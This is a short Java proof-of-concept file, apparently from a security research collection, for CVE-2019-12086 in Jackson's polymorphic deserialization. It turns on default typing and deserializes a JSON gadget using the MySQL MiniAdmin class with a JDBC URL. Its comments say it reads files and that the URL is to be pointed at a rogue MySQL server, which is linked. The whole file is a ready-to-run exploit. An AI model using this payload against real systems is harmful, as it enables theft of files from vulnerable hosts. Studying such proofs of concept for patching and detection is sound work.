package com.test.jackson;

import com.fasterxml.jackson.core.JsonProcessingException;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;

/**
 * CVE-2019-12086
 * jackson文件读取，2.x - 2.9.9，mysql < 8.0.14
 * https://github.com/Gifts/Rogue-MySql-Server
 * @Author:Wadewfsssss
 */

public class CVE_2019_12086 {

    public static void main(String[] args) throws Exception {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        //需要指定Rogue-MySql-Server地址
        String json = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\", \"jdbc:mysql://127.0.0.1:3306/\"]";
        mapper.readValue(json, Object.class);
    }
}
